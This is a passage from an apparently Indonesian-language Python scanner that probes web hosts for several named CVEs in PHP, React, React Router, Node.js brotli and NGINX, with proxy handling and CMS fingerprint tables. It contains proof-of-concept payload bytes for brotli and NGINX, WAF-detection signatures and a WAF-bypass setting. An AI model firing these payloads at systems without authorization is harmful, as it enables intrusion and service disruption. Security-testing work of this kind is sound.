#!/usr/bin/env python3
# /// script
# requires-python = ">=3.9"
# dependencies = [
#     "h11>=0.14.0",
#     "requests>=2.28.0",
#     "tqdm>=4.64.0",
#     "urllib3>=1.26.0",
#     "brotli>=1.1.0",
# ]
# ///
"""riset  Assetnote.io + Zhenpeng + Khai Tran dan Sylvie Mayer."""

import argparse
import asyncio
import atexit
import base64
import json
import math
import os
import random
import re
import ssl
import string
import sys
import tempfile
import threading
import time
import zlib
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from datetime import datetime, timezone
from email.utils import parsedate_to_datetime
from functools import lru_cache
from typing import Dict, List, Optional, Tuple, Union
from urllib.parse import (
    SplitResult,
    quote,
    unquote,
    urljoin,
    urlparse,
    urlsplit,
    urlunsplit,
)

try:
    import h11
except ImportError:
    print("Error: pustaka 'h11' diperlukan. Instal dengan: pip install h11")
    sys.exit(1)

try:
    import requests
    from requests.exceptions import RequestException
except ImportError:
    print("Error: pustaka 'requests' diperlukan. Instal dengan: pip install requests")
    sys.exit(1)

try:
    from tqdm import tqdm
except ImportError:
    print("Error: pustaka 'tqdm' diperlukan. Instal dengan: pip install tqdm")
    sys.exit(1)


PHP_CVES = "CVE-2026-109618 / CVE-2026-109619"
REACT_CVES = "CVE-2025-55182 / CVE-2025-66478"
REACT_ROUTER_CVES = "CVE-2026-42211"
NODEJS_BROTLI_CVES = "CVE-2026-111497"
NGINX_CVES = "CVE-2026-42945"
NODEJS_BROTLI_POC_VECTORS = (
    ("oob-base", bytes.fromhex("200010414141fcffff07002228f00b60f7f41f000000")),
    (
        "oob-extended",
        bytes.fromhex("200010414141fcffff07002228f00b60f7f41f00000000"),
    ),
)
NODEJS_BROTLI_CONTROL_PAYLOAD = bytes.fromhex(
    "0b05807b226f6b223a747275657d03"
)
NODEJS_BROTLI_VULNERABLE_MARKERS = (
    b"error_format_block_length_1",
    b"format block length 1",
)
NODEJS_BROTLI_PATCHED_MARKERS = (
    b"error_format_block_switch",
    b"format block switch",
)
NODEJS_BROTLI_DECODER_MARKERS = (
    b"brotli",
    b"decompress",
    b"decoder",
)
NGINX_AFFECTED_MIN = (0, 6, 27)
NGINX_AFFECTED_MAX = (1, 30, 0)
NGINX_FIXED_VERSION = (1, 30, 1)
NGINX_VERSION_PATTERN = re.compile(
    r"nginx/(\d+)\.(\d+)\.(\d+)(?![0-9A-Za-z.])", re.IGNORECASE
)
NGINX_BODY_READ_LIMIT = 64 << 10
NGINX_POC_PAD_A = 349
NGINX_POC_PAD_PLUS = 400
NGINX_POC_TARGET = b"A" * 6
NGINX_POC_CONTROL_PAD = (
    NGINX_POC_PAD_A + NGINX_POC_PAD_PLUS + len(NGINX_POC_TARGET)
)

PHP_DEFAULT_PATH = "/index.php"
REACT_DEFAULT_PATH = "/"
REACT_ROUTER_DEFAULT_PATH = "/"
NGINX_DEFAULT_PATH = "/"
NGINX_POC_DEFAULT_PATH = "/api"
PHP_DEFAULT_TIMEOUT = 60
REACT_DEFAULT_TIMEOUT = 10
REACT_ROUTER_DEFAULT_TIMEOUT = 10
NGINX_DEFAULT_TIMEOUT = 10
REACT_TIMEOUT_MESSAGE = "permintaan timeout"

PHP_PHPMYADMIN_PATH = "/show_config_errors.php"
PHP_PHPMYADMIN_MARKER = b"phpMyAdmin"
PHP_CONTROL_BOUNDARY = "x"
PHP_PROBE_BOUNDARY = ""
PHP_CONTROL_BODY = b"--x\nContent-Disposition:name=a;filename=\n\n"
PHP_NESTED_KEYS = 62
PHP_BODY_READ_LIMIT = 1 << 20
PHP_EXCERPT_LIMIT = 2048
PHP_CONNECT_TIMEOUT = 10
PHP_MAX_RESPONSE_HEADER_BYTES = 10 << 20
PHP_UPLOAD_CHUNK_SIZE = 64 << 10
PHP_READ_BUFFER_HIGH_WATER = 256 << 10
PHP_READ_BUFFER_LOW_WATER = 64 << 10
PHP_WRITE_BUFFER_HIGH_WATER = 256 << 10
PHP_WRITE_BUFFER_LOW_WATER = 64 << 10
REACT_BODY_READ_LIMIT = 1 << 20
REACT_REQUEST_BODY_EXCERPT = 4096
REACT_ROUTER_BODY_LIMIT = 256 << 10
REACT_ROUTER_FIXED_VERSION = (7, 14, 2)
REACT_ROUTER_AFFECTED_MIN = (7, 0, 0)
REACT_ROUTER_MARKERS = (
    b"__reactroutercontext",
    b"__reactroutermanifest",
    b"__reactrouterroutemodules",
)
REACT_ROUTER_MANIFEST_PATH_PATTERN = re.compile(
    r'"manifestPath"\s*:\s*"([^"]+)"'
)
REACT_ROUTER_VERSION_PATTERNS = (
    re.compile(r'__reactRouterVersion"?\s*[:=]\s*"(\d+\.\d+\.\d+)"'),
    re.compile(r"react-router@(\d+\.\d+\.\d+)"),
    re.compile(r"react-router/(\d+\.\d+\.\d+)/"),
    re.compile(r'"react-router"\s*:\s*"[~^]?(\d+\.\d+\.\d+)"'),
)
MAX_RETRIES = 10
MAX_TIMEOUT = 3600
MAX_RETRY_BACKOFF = 60.0
MAX_RETRY_AFTER = 60.0
MAX_RATE_INTERVAL = 3600.0
MAX_WAF_BYPASS_SIZE_KB = 8 * 1024
TLSVerify = Union[bool, str]
PHP_DEFAULT_USER_AGENT = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 "
    "Safari/537.36 PHP2Shell/1.0.0"
)
FINGERPRINT_USER_AGENT = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 "
    "Safari/537.36"
)
BROWSER_DEFAULT_HEADERS = {
    "User-Agent": FINGERPRINT_USER_AGENT,
    "Accept": (
        "text/html,application/xhtml+xml,application/xml;q=0.9,"
        "image/avif,image/webp,*/*;q=0.8"
    ),
    "Accept-Encoding": "gzip, deflate, br",
}

PHP_PROBES = ((1, 4000), (8, 1020), (20, 1020))
PHP_REJECTED_STATUSES = {400, 403, 411, 413, 414, 417, 422, 429, 431}
PHP_FIXED_VERSIONS = {(8, 2): 35, (8, 3): 36, (8, 4): 27, (8, 5): 12}
PHP_VERSION_PATTERN = re.compile(r"PHP/(\d+)\.(\d+)\.(\d+)(?![0-9A-Za-z])")
PHP_CONNECTION_RESET_MARKERS = (
    "koneksi tertutup",
    "koneksi ditutup",
    "koneksi terputus",
    "connection reset",
    "connection aborted",
    "connection closed",
    "connection lost",
    "broken pipe",
    "peer closed",
    "forcibly closed",
    "remote end closed",
    "respons berakhir sebelum header",
    "eof",
)
HEADER_NAME_PATTERN = re.compile(r"^[!#$%&'*+\-.^_`|~0-9A-Za-z]+$")
SENSITIVE_HEADERS = {
    "authorization",
    "cookie",
    "proxy-authorization",
    "set-cookie",
    "x-api-key",
}
RETRYABLE_HTTP_STATUSES = {429, 502, 503, 504}
REACT_BLOCKED_STATUSES = {401, 403, 406, 407, 429, 502, 503, 504}
NGINX_CONTROL_BLOCKED_STATUSES = (
    PHP_REJECTED_STATUSES | REACT_BLOCKED_STATUSES
)
RETRYABLE_ERROR_MARKERS = (
    "timeout",
    "koneksi",
    "membaca respons",
)
FINGERPRINT_BODY_LIMIT = 4096
FINGERPRINT_HEADERS = {
    "server",
    "via",
    "x-powered-by",
    "cf-ray",
    "cf-cache-status",
    "x-vercel-id",
    "x-vercel-cache",
    "x-nextjs-cache",
    "x-nextjs-request-id",
    "x-nextjs-html-request-id",
    "x-matched-path",
    "x-powered-by",
    "x-akamai-transformed",
    "x-sucuri-id",
    "x-cdn",
    "x-cache",
    "content-type",
    "retry-after",
}
WAF_SIGNATURES = {
    "Cloudflare": ("cloudflare", "cf-ray", "cf-cache-status"),
    "Vercel": ("vercel", "x-vercel-id", "x-vercel-cache"),
    "Netlify": ("netlify", "netlify-vary"),
    "Akamai": ("akamai", "akamai-grn", "x-akamai-transformed"),
    "AWS WAF": ("awswaf", "x-amzn-waf"),
    "Sucuri": ("sucuri", "x-sucuri-id"),
    "Imperva": ("imperva", "incap_ses", "visid_incap"),
    "Fastly": ("fastly", "x-fastly"),
    "Azure Front Door": ("azurefd", "x-azure-ref"),
    "F5 BIG-IP": ("bigip", "ts01"),
}
WAF_BODY_SIGNATURES = {
    "Akamai": (
        b"errors.edgesuite.net",
        b"reference #",
        b"reference&#32;&#35;",
    ),
}
STRONG_CHALLENGE_MARKERS = (
    b"just a moment",
    b"cf-chl",
    b"captcha",
    b"attention required",
    b"vercel security checkpoint",
    b"enable javascript and cookies",
    b"checking your browser",
)
WEAK_CHALLENGE_MARKERS = (
    b"request blocked",
    b"access denied",
)
CHALLENGE_MARKERS = STRONG_CHALLENGE_MARKERS + WEAK_CHALLENGE_MARKERS
CHALLENGE_STATUSES = (401, 403, 406, 429, 503)
WEAK_CHALLENGE_STATUSES = (429, 503)


class Colors:
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"
    MAGENTA = "\033[95m"
    CYAN = "\033[96m"
    WHITE = "\033[97m"
    BOLD = "\033[1m"
    RESET = "\033[0m"


def colorize(text: str, color: str) -> str:
    return f"{color}{text}{Colors.RESET}"


def disable_colors() -> None:
    for name in (
        "RED",
        "GREEN",
        "YELLOW",
        "BLUE",
        "MAGENTA",
        "CYAN",
        "WHITE",
        "BOLD",
        "RESET",
    ):
        setattr(Colors, name, "")


def print_banner() -> None:
    art = r""" __  __          _             ____              ____
|  \/  | ___  __| | __ _ _ __ |  _ \  _____   __/ ___|  ___  ___
| |\/| |/ _ \/ _` |/ _` | '_ \| | | |/ _ \ \ / /\___ \ / _ \/ __|
| |  | |  __/ (_| | (_| | | | | |_| |  __/\ V /  ___) |  __/ (__
|_|  |_|\___|\__,_|\__,_|_| |_|____/ \___| \_/  |____/ \___|\___|
"""
    print(f"\n{Colors.CYAN}{Colors.BOLD}{art}{Colors.RESET}")


def utc_now() -> str:
    return datetime.now(timezone.utc).isoformat().replace("+00:00", "Z")


@dataclass(frozen=True)
class ProxyConfig:
    url: str
    scheme: str
    host: str
    port: int
    display: str
    authorization: Optional[str] = None


def parse_proxy(value: str) -> ProxyConfig:
    raw = value.strip()
    if not raw:
        raise ValueError("--proxy tidak boleh kosong")
    if "://" not in raw:
        raw = "http://" + raw

    parsed = urlsplit(raw)
    scheme = parsed.scheme.lower()
    if scheme not in ("http", "https"):
        raise ValueError("skema proxy harus http:// atau https://")
    if parsed.hostname is None:
        raise ValueError("URL proxy tidak memiliki hostname")
    if parsed.path not in ("", "/") or parsed.query or parsed.fragment:
        raise ValueError("URL proxy tidak boleh memiliki path, query, atau fragment")

    try:
        host = parsed.hostname.encode("idna").decode("ascii")
    except UnicodeError as exc:
        raise ValueError("hostname proxy tidak valid") from exc
    try:
        port = (
            parsed.port
            if parsed.port is not None
            else (443 if scheme == "https" else 80)
        )
    except ValueError as exc:
        raise ValueError("port proxy tidak valid") from exc
    if not 1 <= port <= 65535:
        raise ValueError("port proxy harus antara 1 dan 65535")

    host_display = f"[{host}]" if ":" in host else host
    display = f"{scheme}://{host_display}:{port}"
    url = display
    authorization = None
    if parsed.username is not None:
        username = unquote(parsed.username)
        password = unquote(parsed.password or "")
        credentials = f"{username}:{password}".encode("utf-8")
        authorization = "Basic " + base64.b64encode(credentials).decode("ascii")
        url = (
            f"{scheme}://{quote(username, safe='')}:{quote(password, safe='')}"
            f"@{host_display}:{port}"
        )

    return ProxyConfig(
        url=url,
        scheme=scheme,
        host=host,
        port=port,
        display=display,
        authorization=authorization,
    )


@dataclass
class RuntimeConfig:
    rate_limit: float = 0.0
    retries: int = 2
    retry_backoff: float = 0.5
    proxy: Optional[ProxyConfig] = None
    lock: threading.Lock = field(default_factory=threading.Lock, repr=False)
    next_request: float = 0.0

    def wait(self) -> None:
        if self.rate_limit <= 0:
            return
        with self.lock:
            now = time.monotonic()
            delay = max(0.0, self.next_request - now)
            self.next_request = max(now, self.next_request) + (
                1.0 / self.rate_limit
            )
        if delay > 0:
            time.sleep(delay)

    def backoff(self, attempt: int, retry_after: Optional[float] = None) -> None:
        if retry_after is not None:
            delay = max(0.0, retry_after)
        elif self.retry_backoff > 0:
            try:
                delay = self.retry_backoff * (2**attempt)
            except OverflowError:
                delay = MAX_RETRY_BACKOFF
        else:
            delay = 0.0
        if self.retry_backoff > 0:
            delay += random.uniform(0, self.retry_backoff)
        delay = min(delay, MAX_RETRY_BACKOFF)
        if delay > 0:
            time.sleep(delay)


RUNTIME = RuntimeConfig()


def request_proxies() -> Dict[str, str]:
    if RUNTIME.proxy is None:
        return {"http": "", "https": ""}
    return {"http": RUNTIME.proxy.url, "https": RUNTIME.proxy.url}


def _remove_temp_file(path: str) -> None:
    try:
        os.unlink(path)
    except OSError:
        pass


def merge_ca_bundle(custom_path: str) -> str:
    try:
        with open(requests.certs.where(), "rb") as handle:
            bundled = handle.read()
        with open(custom_path, "rb") as handle:
            custom = handle.read()
    except OSError as exc:
        raise ValueError(f"gagal membaca CA bundle: {exc}") from exc

    if b"-----BEGIN CERTIFICATE-----" not in custom:
        raise ValueError(
            f"CA bundle {custom_path!r} tidak berisi sertifikat PEM"
        )

    fd, merged_path = tempfile.mkstemp(
        prefix="scanner-ca-", suffix=".pem"
    )
    try:
        with os.fdopen(fd, "wb") as handle:
            handle.write(bundled.rstrip() + b"\n")
            handle.write(custom)
            if not custom.endswith(b"\n"):
                handle.write(b"\n")
        ssl.create_default_context(cafile=merged_path)
    except (OSError, ssl.SSLError) as exc:
        _remove_temp_file(merged_path)
        raise ValueError(
            f"CA bundle {custom_path!r} tidak valid: {exc}"
        ) from exc
    except Exception:
        _remove_temp_file(merged_path)
        raise

    atexit.register(_remove_temp_file, merged_path)
    return merged_path


def build_system_ca_bundle() -> str:
    try:
        context = ssl.create_default_context()
        certificates = context.get_ca_certs(binary_form=True)
    except (OSError, ssl.SSLError, ValueError) as exc:
        raise ValueError(f"gagal membaca CA sistem: {exc}") from exc
    if not certificates:
        raise ValueError("trust store sistem tidak berisi sertifikat CA")

    fd, bundle_path = tempfile.mkstemp(
        prefix="scanner-system-ca-", suffix=".pem"
    )
    try:
        with os.fdopen(fd, "wb") as handle:
            for certificate in certificates:
                handle.write(
                    ssl.DER_cert_to_PEM_cert(certificate).encode("ascii")
                )
    except (OSError, ssl.SSLError, ValueError) as exc:
        _remove_temp_file(bundle_path)
        raise ValueError(f"gagal menyiapkan CA sistem: {exc}") from exc
    except Exception:
        _remove_temp_file(bundle_path)
        raise

    atexit.register(_remove_temp_file, bundle_path)
    return bundle_path


def tls_error_message(error: object) -> str:
    text = str(error).strip() or "kesalahan TLS tanpa detail"
    lowered = text.lower()
    verify_failure = any(
        marker in lowered
        for marker in (
            "certificate verify failed",
            "unable to get local issuer",
            "unable to get issuer",
            "self-signed certificate",
            "certificate has expired",
            "hostname mismatch",
            "ip address mismatch",
        )
    )
    if verify_failure:
        return (
            "verifikasi TLS gagal; rantai sertifikat/CA target tidak dapat "
            "diverifikasi. Perbaiki chain di server atau gunakan "
            "--ca-bundle PATH (PEM CA/intermediate) / --system-ca untuk "
            "target berizin; -k hanya untuk lab. "
            f"Detail: {text}"
        )
    return f"kesalahan SSL: {text}"


def retry_after_seconds(headers: Dict[str, str]) -> Optional[float]:
    value = header_value(headers, "Retry-After").strip()
    if not value:
        return None
    try:
        seconds = float(value)
    except ValueError:
        seconds = None
    if seconds is not None:
        if not math.isfinite(seconds):
            return None
        return min(MAX_RETRY_AFTER, max(0.0, seconds))
    try:
        target = parsedate_to_datetime(value)
    except (TypeError, ValueError, OverflowError):
        return None
    if target is None:
        return None
    if target.tzinfo is None:
        target = target.replace(tzinfo=timezone.utc)
    seconds = (target - datetime.now(timezone.utc)).total_seconds()
    return min(MAX_RETRY_AFTER, max(0.0, seconds))


def is_retryable_error(message: Optional[str]) -> bool:
    if not message:
        return False
    lowered = message.lower()
    if any(
        marker in lowered
        for marker in (
            "407",
            "proxy authentication",
            "certificate verify",
            "verifikasi tls",
            "nama header",
            "upgrade protokol",
            "tidak didukung",
            "python 3.11",
        )
    ):
        return False
    return any(marker in lowered for marker in RETRYABLE_ERROR_MARKERS)


def parse_headers(header_list: Optional[List[str]]) -> Dict[str, str]:
    headers: Dict[str, str] = {}
    for header in header_list or []:
        if ":" not in header:
            raise ValueError(
                f"header {header!r} tidak valid; format harus 'Nama: Nilai'"
            )
        key, value = header.split(":", 1)
        key = key.strip()
        if not key:
            raise ValueError(f"header {header!r} tidak valid; nama header kosong")
        value = value.lstrip()
        if not HEADER_NAME_PATTERN.fullmatch(key):
            raise ValueError(f"nama header {key!r} tidak valid")
        if "\r" in value or "\n" in value:
            raise ValueError(f"nilai header {key!r} tidak valid")
        try:
            key.encode("ascii")
            value.encode("latin-1")
        except UnicodeEncodeError as exc:
            raise ValueError(
                f"header {key!r} tidak dapat dikodekan sebagai HTTP/1.1"
            ) from exc
        for existing in list(headers):
            if existing.lower() == key.lower():
                del headers[existing]
        headers[key] = value
    return headers


def has_header(headers: Dict[str, str], name: str) -> bool:
    return any(key.lower() == name.lower() for key in headers)


def set_header(headers: Dict[str, str], name: str, value: str) -> None:
    for key in list(headers):
        if key.lower() == name.lower():
            del headers[key]
    headers[name] = value


def header_value(headers: Dict[str, str], name: str) -> str:
    for key, value in headers.items():
        if key.lower() == name.lower():
            return value
    return ""


def remove_header(headers: Dict[str, str], name: str) -> None:
    for key in list(headers):
        if key.lower() == name.lower():
            del headers[key]


def normalize_url(raw_url: str, default_path: str = REACT_DEFAULT_PATH) -> str:
    raw_url = raw_url.strip()
    if not raw_url:
        raise ValueError("URL tidak valid atau kosong")
    if "://" not in raw_url:
        raw_url = "https://" + raw_url

    parsed = urlsplit(raw_url)
    if parsed.scheme not in ("http", "https") or not parsed.netloc:
        raise ValueError("URL HTTP tidak valid")
    if parsed.username is not None or parsed.password is not None:
        raise ValueError(
            "kredensial di URL tidak didukung; gunakan header Authorization"
        )

    path = parsed.path
    if not path or path == "/":
        path = default_path
    return urlunsplit((parsed.scheme, parsed.netloc, path, "", ""))


def safe_url_label(raw_url: str) -> str:
    value = raw_url.strip()
    if not value:
        return "<URL kosong>"
    candidate = value if "://" in value else "https://" + value
    try:
        parsed = urlsplit(candidate)
    except ValueError:
        return "<URL tidak valid>"
    if not parsed.netloc:
        return "<URL tidak valid>"
    netloc = parsed.netloc.rsplit("@", 1)[-1]
    return urlunsplit((parsed.scheme, netloc, parsed.path, "", ""))


def replace_path(target_url: str, path_value: str, default_path: str) -> str:
    parsed = urlsplit(target_url)
    custom = urlsplit(path_value if path_value.startswith("/") else "/" + path_value)
    path = custom.path or default_path
    return urlunsplit((parsed.scheme, parsed.netloc, path, "", ""))


def phpmyadmin_target(target_url: str) -> str:
    parsed = urlsplit(target_url)
    return urlunsplit((parsed.scheme, parsed.netloc, PHP_PHPMYADMIN_PATH, "", ""))


def terminal_safe(value: str) -> str:
    return "".join(
        character
        if character >= " " and character != "\x7f"
        else f"\\x{ord(character):02x}"
        for character in value
    )


def redact_header(name: str, value: str) -> str:
    return "<disamarkan>" if name.lower() in SENSITIVE_HEADERS else value


def load_lines(path: str, label: str) -> List[str]:
    values: List[str] = []
    try:
        with open(path, "r", encoding="utf-8-sig") as handle:
            for line in handle:
                value = line.strip().lstrip("\ufeff")
                if value and not value.startswith("#"):
                    values.append(value)
    except OSError as exc:
        print(colorize(f"[ERROR] Gagal membaca file {label}: {exc}", Colors.RED))
        sys.exit(1)
    return values


def normalize_paths(paths: List[str]) -> List[str]:
    normalized: List[str] = []
    seen = set()
    for path in paths:
        path = path if path.startswith("/") else "/" + path
        if path not in seen:
            seen.add(path)
            normalized.append(path)
    return normalized


def deduplicate_hosts(hosts: List[str]) -> List[str]:
    deduplicated = []
    seen = set()
    for host in hosts:
        try:
            parsed = urlsplit(normalize_url(host, REACT_DEFAULT_PATH))
            key = (
                parsed.scheme.lower(),
                parsed.netloc.lower(),
                parsed.path,
            )
        except ValueError:
            key = (safe_url_label(host),)
        if key not in seen:
            seen.add(key)
            deduplicated.append(host)
    return deduplicated


TECH_CONFIDENCE_RANK = {"low": 1, "medium": 2, "high": 3}
TECH_CONFIDENCE_LABEL = {
    "high": "terdeteksi",
    "medium": "terindikasi",
    "low": "indikasi lemah",
}
TECH_CRITICAL_NAMES = ("PHP", "React", "Node.js", "NGINX")
TECH_EXTRA_NAMES = ("Next.js", "React Router", "CodeIgniter")
COOKIE_NAME_PATTERN = re.compile(r"(?:^|[,;]\s*)([A-Za-z0-9_.-]+)=")

CMS_SIGNATURES = (
    {
        "name": "WordPress",
        "php": True,
        "cookies": (
            ("wordpress_", "medium"),
            ("wp-settings-", "medium"),
            ("wp_woocommerce_session_", "medium"),
        ),
        "headers": (
            ("x-pingback", "xmlrpc.php", "medium"),
            ("link", "api.w.org", "medium"),
        ),
        "body": (
            (b"/wp-content/", "high"),
            (b"/wp-includes/", "high"),
            (b'content="wordpress', "high"),
            (b"wp-json", "medium"),
            (b"wp-emoji-release.min.js", "medium"),
            (b"wp-block-", "low"),
        ),
    },
    {
        "name": "Drupal",
        "php": True,
        "cookies": (),
        "headers": (
            ("x-drupal-cache", "", "high"),
            ("x-drupal-dynamic-cache", "", "high"),
            ("x-generator", "drupal", "high"),
        ),
        "body": (
            (b"/sites/default/files", "high"),
            (b"/sites/all/", "medium"),
            (b"drupal.settings", "medium"),
            (b"drupalsettings", "medium"),
            (b"data-drupal-", "medium"),
            (b"core/misc/drupal.js", "medium"),
            (b'content="drupal', "high"),
            (b"content='drupal", "high"),
        ),
    },
    {
        "name": "Joomla",
        "php": True,
        "cookies": (),
        "headers": (
            ("x-content-encoded-by", "joomla", "high"),
            ("x-powered-by", "joomla", "high"),
        ),
        "body": (
            (b"/media/system/js/", "high"),
            (b"/components/com_", "high"),
            (b"/modules/mod_", "medium"),
            (b"option=com_", "medium"),
            (b'content="joomla', "high"),
            (b"content='joomla", "high"),
            (b"/templates/system/", "medium"),
            (b"joomla!", "low"),
        ),
    },
    {
        "name": "Magento",
        "php": True,
        "cookies": (
            ("private_content_version", "medium"),
            ("form_key", "medium"),
            ("mage-cache-sessid", "high"),
        ),
        "headers": (
            ("x-magento-cache-debug", "", "high"),
            ("x-magento-tags", "", "high"),
            ("x-magento-vary", "", "high"),
        ),
        "body": (
            (b"/static/version", "high"),
            (b"/pub/static/", "high"),
            (b"data-mage-init", "high"),
            (b"mage/cookies", "medium"),
            (b"magento_", "low"),
        ),
    },
    {
        "name": "Shopify",
        "php": False,
        "cookies": (
            ("_shopify_", "high"),
            ("cart_sig", "medium"),
            ("secure_customer_sig", "medium"),
        ),
        "headers": (
            ("x-shopid", "", "high"),
            ("x-shopify-stage", "", "high"),
            ("x-sorting-hat-podid", "", "high"),
        ),
        "body": (
            (b"cdn.shopify.com", "high"),
            (b"shopify-section", "high"),
            (b"shopify.theme", "high"),
            (b"/cart.js", "low"),
            (b"myshopify.com", "medium"),
        ),
    },
    {
        "name": "Wix",
        "php": False,
        "cookies": (),
        "headers": (
            ("x-wix-request-id", "", "high"),
            ("x-wix-renderer-server", "", "high"),
            ("server", "pepyaka", "high"),
        ),
        "body": (
            (b"static.wixstatic.com", "high"),
            (b"wix-code", "medium"),
            (b"wixsite.com", "high"),
            (b"data-wix", "low"),
        ),
    },
    {
        "name": "Squarespace",
        "php": False,
        "cookies": (),
        "headers": (("server", "squarespace", "high"),),
        "body": (
            (b"static1.squarespace.com", "high"),
            (b"squarespace-cdn.com", "high"),
            (b"sqs-block", "high"),
            (b"squarespace.afterbodyload", "high"),
        ),
    },
    {
        "name": "Ghost",
        "php": False,
        "cookies": (("ghost-admin-api-session", "high"),),
        "headers": (
            ("x-ghost-cache-status", "", "high"),
            ("x-powered-by", "ghost", "high"),
        ),
        "body": (
            (b'content="ghost', "high"),
            (b"ghost-url", "high"),
            (b"/assets/built/", "medium"),
            (b"cdn.ghost.io", "high"),
            (b"ghost.io", "medium"),
        ),
    },
    {
        "name": "TYPO3",
        "php": True,
        "cookies": (
            ("fe_typo_user", "high"),
            ("be_typo_user", "high"),
        ),
        "headers": (),
        "body": (
            (b"/typo3temp/", "high"),
            (b"/typo3conf/", "high"),
            (b'content="typo3', "high"),
            (b"typo3", "low"),
        ),
    },
    {
        "name": "Craft CMS",
        "php": True,
        "cookies": (
            ("CraftSessionId", "high"),
            ("CRAFT_CSRF_TOKEN", "high"),
        ),
        "headers": (("x-powered-by", "craft cms", "high"),),
        "body": (
            (b"craft cms", "medium"),
            (b"craftcms", "high"),
        ),
    },
    {
        "name": "Umbraco",
        "php": False,
        "cookies": (
            ("UMB-XSRF-TOKEN", "high"),
            ("UMB_UCONTEXT", "high"),
        ),
        "headers": (),
        "body": (
            (b"/umbraco/", "high"),
            (b"umbraco", "low"),
        ),
    },
    {
        "name": "PrestaShop",
        "php": True,
        "cookies": (("PrestaShop-", "high"),),
        "headers": (("x-powered-by", "prestashop", "high"),),
        "body": ((b"prestashop", "low"),),
    },
    {
        "name": "OpenCart",
        "php": True,
        "cookies": (("OCSESSID", "high"),),
        "headers": (),
        "body": (
            (b"catalog/view/theme/", "high"),
            (b"route=common/home", "high"),
            (b"index.php?route=", "medium"),
            (b"opencart", "low"),
        ),
    },
    {
        "name": "Moodle",
        "php": True,
        "cookies": (("MoodleSession", "high"),),
        "headers": (),
        "body": (
            (b"moodle", "medium"),
            (b"m.cfg", "high"),
            (b"/course/view.php", "medium"),
            (b"/login/index.php", "low"),
            (b"sesskey", "low"),
        ),
    },
    {
        "name": "MediaWiki",
        "php": True,
        "cookies": (),
        "headers": (),
        "body": (
            (b'content="mediawiki', "high"),
            (b"/load.php?", "medium"),
            (b"mediawiki", "medium"),
            (b"mw-", "low"),
            (b"/wiki/", "low"),
        ),
    },
    {
        "name": "Discourse",
        "php": False,
        "cookies": (),
        "headers": (
            ("x-discourse-route", "", "high"),
            ("discourse-proxy", "", "high"),
        ),
        "body": (
            (b"data-discourse", "high"),
            (b"discourse", "medium"),
            (b"/assets/discourse", "high"),
            (b"discourse.org", "medium"),
        ),
    },
    {
        "name": "phpBB",
        "php": True,
        "cookies": (
            ("phpbb3_", "high"),
            ("phpbb2_", "high"),
        ),
        "headers": (),
        "body": (
            (b"phpbb", "medium"),
            (b"/styles/prosilver/", "high"),
            (b"/ucp.php", "medium"),
            (b"/viewtopic.php", "medium"),
        ),
    },
    {
        "name": "vBulletin",
        "php": True,
        "cookies": (
            ("bb_sessionhash", "high"),
            ("bb_userid", "medium"),
        ),
        "headers": (),
        "body": (
            (b"vbulletin", "high"),
            (b"/core/clientscript/", "medium"),
            (b"/forumdisplay.php", "medium"),
            (b"bburl", "low"),
        ),
    },
    {
        "name": "XenForo",
        "php": True,
        "cookies": (
            ("xf_", "high"),
            ("xf_session", "high"),
        ),
        "headers": (),
        "body": (
            (b"xenforo", "high"),
            (b"data-xf-", "high"),
            (b"/js/xf/", "high"),
            (b"/community/", "low"),
        ),
    },
    {
        "name": "Blogger",
        "php": False,
        "cookies": (),
        "headers": (("x-powered-by", "blogger", "high"),),
        "body": (
            (b"blogger.com", "medium"),
            (b"blogspot.com", "high"),
            (b"blogger-template", "high"),
            (b"data:blog", "high"),
        ),
    },
    {
        "name": "HubSpot CMS",
        "php": False,
        "cookies": (),
        "headers": (),
        "body": (
            (b"hs_cos_wrapper", "high"),
            (b"cdn2.hubspot.net", "high"),
            (b"hs-script-loader", "high"),
            (b"hubspot", "low"),
        ),
    },
    {
        "name": "Webflow",
        "php": False,
        "cookies": (),
        "headers": (),
        "body": (
            (b"data-wf-site", "high"),
            (b"webflow.com", "medium"),
            (b"assets.website-files.com", "high"),
            (b"webflow.js", "high"),
        ),
    },
    {
        "name": "Grav",
        "php": True,
        "cookies": (),
        "headers": (("x-powered-by", "grav", "high"),),
        "body": (
            (b"grav-site", "high"),
            (b"/user/themes/", "medium"),
            (b"/system/assets/", "low"),
            (b"grav cms", "medium"),
        ),
    },
    {
        "name": "October CMS",
        "php": True,
        "cookies": (("october_session", "high"),),
        "headers": (),
        "body": (
            (b"october cms", "high"),
            (b"octobercms", "high"),
            (b"/modules/system/assets/", "high"),
        ),
    },
    {
        "name": "Bitrix",
        "php": True,
        "cookies": (
            ("BITRIX_SM_", "high"),
            ("bitrix_", "high"),
        ),
        "headers": (),
        "body": (
            (b"/bitrix/", "high"),
            (b"bitrix", "medium"),
            (b"bitrix24", "medium"),
        ),
    },
    {
        "name": "Tilda",
        "php": False,
        "cookies": (),
        "headers": (),
        "body": (
            (b"tildacdn.com", "high"),
            (b"tilda.ws", "high"),
            (b"tilda", "low"),
        ),
    },
    {
        "name": "Weebly",
        "php": False,
        "cookies": (),
        "headers": (),
        "body": (
            (b"weebly", "medium"),
            (b"wsimg.com", "high"),
            (b"editmysite.com", "high"),
        ),
    },
    {
        "name": "Jimdo",
        "php": False,
        "cookies": (),
        "headers": (),
        "body": (
            (b"jimdo", "medium"),
            (b"jimstatic.com", "high"),
            (b"jimcdn.com", "high"),
        ),
    },
    {
        "name": "Duda",
        "php": False,
        "cookies": (),
        "headers": (),
        "body": (
            (b"dudamobile", "high"),
            (b"dudasite", "high"),
            (b"dmws", "low"),
        ),
    },
    {
        "name": "Google Sites",
        "php": False,
        "cookies": (),
        "headers": (),
        "body": (
            (b"sites.google.com", "high"),
            (b"gstatic.com/atari", "high"),
            (b"google-sites", "low"),
        ),
    },
    {
        "name": "Lokomedia",
        "php": True,
        "cookies": (),
        "headers": (),
        "body": (
            (b"media.php?module=", "high"),
            (b"foto_berita", "medium"),
            (b"foto_banner", "medium"),
            (b"img_album", "medium"),
            (b"img_galeri", "medium"),
            (b"lokomedia", "low"),
        ),
    },
    {
        "name": "AuraCMS",
        "php": True,
        "cookies": (),
        "headers": (),
        "body": (
            (b"auracms", "high"),
